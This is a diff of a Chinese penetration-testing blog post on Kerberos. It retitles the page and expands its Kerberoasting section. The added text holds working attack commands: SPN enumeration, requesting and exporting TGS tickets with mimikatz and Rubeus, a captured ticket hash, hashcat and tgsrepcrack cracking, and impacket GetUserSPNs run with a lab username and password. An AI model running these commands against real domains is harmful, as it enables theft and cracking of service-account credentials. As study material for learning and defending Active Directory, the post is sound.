@@ -11,7 +11,7 @@
   <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.jpg">
   <link rel="icon" href="/img/favicon.jpg">
   
-    <link rel="canonical" href="https://www.dr0n.top/posts/dcdc9b09/"/>
+    <link rel="canonical" href="https://www.dr0n.top/posts/7fde5404/"/>
   
 
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
@@ -25,8 +25,8 @@
   
     <meta name="description" content="Kerberos协议简介 &amp; 认证过程Kerberos 是一种由MIT提出的一种网络身份验证协议，用于域环境中，它是一种基于票据(Ticket)的认证方式。Kerberos 认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意的读取、修改和插入，在以上情况下，Kerberos 作为一种可信任的第三方认证服务，是">
 <meta property="og:type" content="article">
-<meta property="og:title" content="内网渗透学习(Kerberos篇)">
-<meta property="og:url" content="https://www.dr0n.top/posts/dcdc9b09/index.html">
+<meta property="og:title" content="域渗透学习(Kerberos篇)">
+<meta property="og:url" content="https://www.dr0n.top/posts/7fde5404/index.html">
 <meta property="og:site_name" content="Dr0n&#39;s blog">
 <meta property="og:description" content="Kerberos协议简介 &amp; 认证过程Kerberos 是一种由MIT提出的一种网络身份验证协议，用于域环境中，它是一种基于票据(Ticket)的认证方式。Kerberos 认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意的读取、修改和插入，在以上情况下，Kerberos 作为一种可信任的第三方认证服务，是">
 <meta property="og:locale" content="zh_CN">
@@ -45,6 +45,8 @@
 <meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/kerberos-13.png">
 <meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/kerberos-14.png">
 <meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/kerberos-15.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/kerberos-27.png">
+<meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/ichunqiu/Certify-12.png">
 <meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/kerberos-16.png">
 <meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/kerberos-17.png">
 <meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/kerberos-20.png">
@@ -57,7 +59,7 @@
 <meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/kerberos-25.png">
 <meta property="og:image" content="https://www.dr0n.top/img/%E5%86%85%E7%BD%91/kerberos-26.png">
 <meta property="article:published_time" content="2025-09-13T12:00:00.000Z">
-<meta property="article:modified_time" content="2026-05-09T13:03:31.720Z">
+<meta property="article:modified_time" content="2026-05-26T05:28:11.034Z">
 <meta property="article:author" content="dr0n">
 <meta property="article:tag" content="内网渗透">
 <meta property="article:tag" content="域">
@@ -67,7 +69,7 @@
   
   
   
-  <title>内网渗透学习(Kerberos篇) - Dr0n&#39;s blog</title>
+  <title>域渗透学习(Kerberos篇) - Dr0n&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -419,7 +421,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="内网渗透学习(Kerberos篇)"></span>
+            <span id="subtitle" data-typed-text="域渗透学习(Kerberos篇)"></span>
           
         </div>
 
@@ -458,7 +460,7 @@
         
         
         
-          118 分钟
+          120 分钟
         
       </span>
     
@@ -506,7 +508,7 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">内网渗透学习(Kerberos篇)</h1>
+            <h1 id="seo-header">域渗透学习(Kerberos篇)</h1>
             
             
               <div class="markdown-body">
@@ -669,31 +671,36 @@
 
 <p><img src="/img/%E5%86%85%E7%BD%91/kerberos-13.png" srcset="/img/loading.gif" lazyload></p>
 <p>CN&#x3D;Users 的是域账户注册的 SPN，CN&#x3D;Computers 是机器账户。我们应该选择域用户进行利用，因为机器用户的口令无法远程链接</p>
-<h3 id="Kerberoasting利用"><a href="#Kerberoasting利用" class="headerlink" title="Kerberoasting利用"></a>Kerberoasting利用</h3><blockquote>
-<p>域内的任意主机都可以查询 SPN，任何一个域用户都可以申请 TGS 票据</p>
-</blockquote>
-<p>使用 PowerSploit 的 PowerView.ps1 查找可利用的 SPN</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Get-NetUser</span> <span class="hljs-literal">-spn</span> <span class="hljs-literal">-AdminCount</span>|<span class="hljs-built_in">Select</span> name,whencreated,pwdlastset,last<br></code></pre></td></tr></table></figure>
-
-<p>或者使用 kerberoast 的 GetUserSPNs 查找</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">cscript GetUserSPNs.vbs<br></code></pre></td></tr></table></figure>
+<h3 id="Kerberoasting利用"><a href="#Kerberoasting利用" class="headerlink" title="Kerberoasting利用"></a>Kerberoasting利用</h3><h4 id="寻找有价值的-SPN"><a href="#寻找有价值的-SPN" class="headerlink" title="寻找有价值的 SPN"></a>寻找有价值的 SPN</h4><p>域内的任意主机都可以查询 SPN，任何一个域用户都可以申请 TGS 票据</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 使用 PowerSploit 的 PowerView.ps1 查找可利用的 SPN</span><br><span class="hljs-built_in">Get-NetUser</span> <span class="hljs-literal">-spn</span> <span class="hljs-literal">-AdminCount</span>|<span class="hljs-built_in">Select</span> name,whencreated,pwdlastset,last<br><br><span class="hljs-comment"># 或使用 kerberoast 的 GetUserSPNs 查找</span><br>cscript GetUserSPNs.vbs<br></code></pre></td></tr></table></figure>
 
 <p><img src="/img/%E5%86%85%E7%BD%91/kerberos-14.png" srcset="/img/loading.gif" lazyload></p>
-<p>根据扫描出的结果使用微软提供的类 KerberosRequestorSecurityToken 发起 kerberos 请求，申请票据</p>
+<h4 id="请求-导出-破解-TGS"><a href="#请求-导出-破解-TGS" class="headerlink" title="请求&#x2F;导出&#x2F;破解 TGS"></a>请求&#x2F;导出&#x2F;破解 TGS</h4><p>根据扫描出的结果使用微软提供的类 KerberosRequestorSecurityToken 发起 kerberos 请求，申请票据</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 请求指定服务的 TGS</span><br><span class="hljs-built_in">Add-Type</span> <span class="hljs-literal">-AssemblyName</span> System.IdentityModel<br><span class="hljs-built_in">New-Object</span> System.IdentityModel.Tokens.KerberosRequestorSecurityToken <span class="hljs-literal">-ArgumentList</span> <span class="hljs-string">&quot;MSSQLSvc/aa.xxx.com:1433&quot;</span><br><br><span class="hljs-comment"># 请求所有服务的 TGS</span><br><span class="hljs-built_in">Add-Type</span> <span class="hljs-literal">-AssemblyName</span> System.IdentityModel<br>setspn.exe <span class="hljs-literal">-q</span> */* | <span class="hljs-built_in">Select-String</span> <span class="hljs-string">&#x27;^CN&#x27;</span> <span class="hljs-literal">-Context</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span> | % &#123; <span class="hljs-built_in">New-Object</span> System.IdentityModel.Tokens.KerberosRequestorSecurityToken <span class="hljs-literal">-ArgumentList</span> <span class="hljs-variable">$_</span>.Context.PostContext[<span class="hljs-number">0</span>].Trim() &#125;<br></code></pre></td></tr></table></figure>
 
 
 <p>Kerberos 协议中请求的票据会保存在内存中，可以通过 klist 命令查看当前会话存储的 kerberos 票据</p>
 <p><img src="/img/%E5%86%85%E7%BD%91/kerberos-15.png" srcset="/img/loading.gif" lazyload></p>
-<p>然后可以使用 mimikatz 导出TGS</p>
+<p>使用 mimikatz 导出TGS</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kerberos::list /export<br></code></pre></td></tr></table></figure>
 
+<p>用 kerberoast 下的 tgsrepcrack 爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python tgsrepcrack.py wordlist.txt test.kirbi<br></code></pre></td></tr></table></figure>
 
-<p>或者用更简单的方式：直接用 Rubeus 导出 Hash 后用 Hashcat 跑就行，注意类型是 13100</p>
+<p><img src="/img/%E5%86%85%E7%BD%91/kerberos-27.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="直接利用"><a href="#直接利用" class="headerlink" title="直接利用"></a>直接利用</h4><p>Rubeus 可以不需要搭配 mimikatz，直接导出可爆破的 hash</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\Users\Administrator\Desktop&gt; .\Rubeus.exe kerberoast<br><br>   ______        _<br>  (_____ \      | |<br>   _____) )_   _| |__  _____ _   _  ___<br>  |  __  /| | | |  _ \| ___ | | | |/___)<br>  | |  \ \| |_| | |_) ) ____| |_| |___ |<br>  |_|   |_|____/|____/|_____)____/(___/<br><br>  v1.<span class="hljs-number">6.4</span><br><br><br>[*] Action: Kerberoasting<br><br>[*] NOTICE: AES hashes will be returned <span class="hljs-keyword">for</span> AES<span class="hljs-literal">-enabled</span> accounts.<br>[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC <span class="hljs-keyword">for</span> these accounts.<br><br>[*] Searching the current domain <span class="hljs-keyword">for</span> Kerberoastable users<br><br>[*] Total kerberoastable users : <span class="hljs-number">1</span><br><br><br>[*] SamAccountName         : dd<br>[*] DistinguishedName      : CN=dd,CN=Users,DC=xxx,DC=com<br>[*] ServicePrincipalName   : MSSQLSvc/aa.xxx.com:<span class="hljs-number">1433</span><br>[*] PwdLastSet             : <span class="hljs-number">2026</span>/<span class="hljs-number">4</span>/<span class="hljs-number">24</span> <span class="hljs-number">14</span>:<span class="hljs-number">17</span>:<span class="hljs-number">50</span><br>[*] Supported ETypes       : RC4_HMAC_DEFAULT<br>[*] Hash                   : <span class="hljs-variable">$krb5tgs</span><span class="hljs-variable">$23</span><span class="hljs-variable">$</span>*dd<span class="hljs-variable">$xxx</span>.com<span class="hljs-variable">$MSSQLSvc</span>/aa.xxx.com:<span class="hljs-number">1433</span>*<span class="hljs-variable">$A8C55D8BBD09158272503B40B67B1D</span><br>                             <span class="hljs-number">1</span>A<span class="hljs-variable">$DDCC32CDCD51BA679CA82651AEE9B696A3C3D18278F6C891A3DC17371F3F4A22315F2D50E618F</span><br>                             A7DC7BD7C22607BB5EFB13B0ACDEB555A072788D755AD1BA9EF1C96808ED6F4F11F493FED3ECA26B<br>                             <span class="hljs-number">38401584</span>B97A0AD3AF4351A1517AA2ED338AD11BCADC6D75894711EDA6D3766C85E5C6E264DE7A48<br>                             <span class="hljs-number">890</span>A3373FC74F797E0D9524C7D66B0866D356D59AB7F534493F39B0D21F854A0C66860DBBDAD8B8C<br>                             <span class="hljs-number">7</span>D9B0823CB62A49038441520757DBCAC533D4BFF3031FA2DF740A80A5E5294318D06152FB4968FD5<br>                             <span class="hljs-number">32577</span>B22F7B17EA527535513B4DC10380DE9383987290E2249ED6FF1BA81EB474F40F4DEEF8B0FD9<br>                             <span class="hljs-number">396</span>DBA87746241FF84E60F96DA4A4A0A2307E2234D86AFFBFA97989728313532805659D26876A07B<br>                             <span class="hljs-number">53903</span>B63B625D93F87F7A38853AED85B81D2D1AB7DFCDD6248CCF5941B3ADC37728528A4D6F99426<br>                             C988D49EEF4B38E3329BEA8A9D1614A26D0D4DE5A1B8E79BF73C59CDB7355B8DFCB8C6AFEB5A464C<br>                             D4E6414ACD1503A30D38572C3A29D50A80CA0D344D184A5B44C0A282C5ACE085A15A0C1DE311BBD4<br>                             <span class="hljs-number">1</span>F50AA8435CC19F506459BE409C085D5DBFE6458E8D54AFC2E26AF5ECC86A5AC24ACA6D62E90DA23<br>                             AC3031F1A4B5F213D0951DDA366F4CF4F38B6F2F6CD426B4B56DA22E957266616E8145600CD54A8C<br>                             A3351CCA922F63B3A1C9DB03729BB73D18EE046E6F6221EA4E23BB25103DEAE09AA58F1955F44733<br>                             EFE09CBB75B1F8CE4048B185F5E11ACD4F7EA1E959035D5118F20924329B5F384F6B7B4AB90736B2<br>                             E10DD59337DDF386F3E5C69ED95312C92DAB86333668FBEF64B627CBC72B4D9BD86DBE8475D55936<br>                             E4E26732F0B796871FFDEF1F544158CDBD81550CC5A1D351BB5EEEECC16610BAF0728A98CD6D474C<br>                             D6B4E2423BCAD02372EFBB6D6F4A38CC307E73D85D971A9544342E8626128D6B7426301E524DF4F1<br>                             BD1F144093EDDD29AEC32FE05BBA39C642A96663F2E05EEE9779DB253711D31056968210F644AA04<br>                             B41F643590DBF681DCD1D7F012DCB176E759D628F86DF6C84DF566A09470C757EEF4F0F5C02DD350<br>                             A8EA7EFFA575E27D37FB4A46D284E5ACB39B20D8E9ED4192D130036F50104BB3D638667979EA3F55<br>                             <span class="hljs-number">0802</span>F9A93615B90D51A6C4F751FB90864472BDB1FE76816AB98E424C40FE33490D89CD2C705DE6A5<br>                             <span class="hljs-number">74</span>D094ABE5934877261008B75CC333E507936EF297F2EDB5FABBDD19E42B60ABB7989E2B463E0477<br>                             <span class="hljs-number">188</span>F23324D71C5C0940A2833B0BB4BD13482D66BBC5D4B8A22E99E93129BBAD587FF53EE4C2E8CBC<br>                             EF272C640065A3C8B4F9DA6BFD178E0567A486E4F6A4A9460B92E604A86C3377B37EA7D1DEA1E775<br>                             <span class="hljs-number">2</span>C29A5D41433D901DB71B82145EB193B7EABD74480A24F6372430D0D0C5224F08E0210FD2D485719<br>                             <span class="hljs-number">8</span>A2848E3D7F436AA81610BE846729B25E0DD5083301FBB74238492A5A33277C28003217BD93832FB<br>                             E17B56300EC3DBACC8CEDB6BB709C0F8D2F2FA12CBCB602E61A5FD0FC9E33EF8349A04A3D0A370CC<br>                             D1C73066B7EEAA822E3226F255472F9B3A1990CC6B0B95819<br></code></pre></td></tr></table></figure>
 
 
+<p>用 Hashcat 跑就行，注意类型是 13100</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt -o found.txt --force<br></code></pre></td></tr></table></figure>
 
+
+<hr>
+<p>impacket 下的 GetUserSPNs 可以从域外获取 hash，需要一个域用户密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python GetUserSPNs.py -request -dc-ip 192.168.100.126 -debug xxx.com/dd:Qwer123<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Certify-12.png" srcset="/img/loading.gif" lazyload></p>
 <h2 id="委派"><a href="#委派" class="headerlink" title="委派"></a>委派</h2><p>Kerberos 的委派(Delegation)，简单说就是：<strong>允许一个服务代表用户去访问另一个服务</strong></p>
 <p>比如用户访问一个 Web 应用，Web 应用后端还需要去访问数据库、文件服务器或 API。Kerberos 委派让 Web 应用可以 “以这个用户的身份” 继续访问后端资源，而不是只能用 Web 服务自己的身份</p>
 <p>此外接受委派的用户只能是服务账户或者计算机用户</p>
@@ -828,8 +835,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>内网渗透学习(Kerberos篇)</div>
-      <div>https://www.dr0n.top/posts/dcdc9b09/</div>
+      <div>域渗透学习(Kerberos篇)</div>
+      <div>https://www.dr0n.top/posts/7fde5404/</div>
     </div>
     <div class="license-meta">
       
@@ -847,7 +854,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2026年5月9日</div>
+          <div>2026年5月26日</div>
         </div>
       
       
